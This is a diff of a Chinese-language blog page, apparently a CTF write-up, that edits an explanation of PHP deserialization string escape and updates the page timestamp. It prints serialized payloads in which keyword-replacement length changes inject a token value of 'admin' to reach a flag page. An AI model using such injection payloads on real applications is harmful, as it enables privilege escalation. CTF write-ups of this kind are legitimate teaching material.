@@ -498,7 +498,7 @@
 <p>结果O:7:”message”:4:{s:4:”from”;s:1:”1”;s:3:”msg”;s:1:”1”;s:2:”to”;s:134:”fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck;s:5:”token”;s:5:”admin”;}”;s:5:”token”;s:4:”user”;}</p>
 <p>那我们现在加上替换</p>
 <p>O:7:”message”:4:{s:4:”from”;s:1:”1”;s:3:”msg”;s:1:”1”;s:2:”to”;s:134:”loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU”;s:5:”token”;s:5:”admin”;}”;s:5:”token”;s:4:”user”;}</p>
-<p>注意s:130都是130个字符没有改变。那我们在反序列化的时候，服务器一定会认准130这个长度，后面形成闭合，自动舍去</p>
+<p>注意s:134都是134个字符没有改变。那我们在反序列化的时候，服务器一定会认准134这个长度，后面形成闭合，自动舍去，于是我们就是改变token的值，得到访问message.php,得到flag</p>
 
   
   
@@ -533,7 +533,7 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-03-11T00:22:13+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-03-11T00:27:29+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
     <p>更新于：Mar 11, 2021</p>
